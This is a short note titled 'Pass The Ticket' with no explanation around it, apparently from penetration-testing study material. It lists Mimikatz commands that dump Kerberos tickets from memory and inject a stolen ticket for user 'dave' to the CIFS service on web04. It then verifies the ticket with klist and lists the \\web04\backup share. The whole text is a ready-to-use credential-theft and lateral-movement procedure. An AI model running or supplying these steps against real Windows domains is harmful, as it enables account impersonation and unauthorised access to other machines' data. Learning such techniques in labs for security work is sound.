# Pass The Ticket

```
privilege::debug
sekurlsa::tickets /export
```

```
dir *.kirbi
```

```
kerberos::ptt [0;12bd0]-0-0-40810000-dave@cifs-web04.kirbi
```

```
klist
```

```
ls \\web04\backup
```
